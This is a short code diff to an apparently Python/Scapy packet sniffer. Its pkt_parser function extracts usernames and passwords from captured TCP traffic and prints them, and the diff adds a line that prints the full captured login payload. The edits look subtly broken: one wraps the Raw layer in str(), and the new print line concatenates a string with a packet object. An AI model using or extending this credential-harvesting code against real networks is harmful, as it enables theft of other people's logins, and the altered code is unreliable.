@@ -36,10 +36,11 @@ def get_login_pass(body):
 			return(user, passwd)
 
 def pkt_parser(packet):
-	if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
+	if packet.haslayer(TCP) and packet.haslayer(str(Raw)) and packet.haslayer(IP):
 		body = str(packet[TCP].payload)
 		user_pass = get_login_pass(body)
 		if user_pass != None:
+			print(c("[----] Website Login: " + packet[TCP].payload, "green"))
 			print(c("[----] Username Found: " + parse.unquote(user_pass[0]), "green"))
 			print(c("[----] Password Found: " + parse.unquote(user_pass[1]), "green"))
 	else:
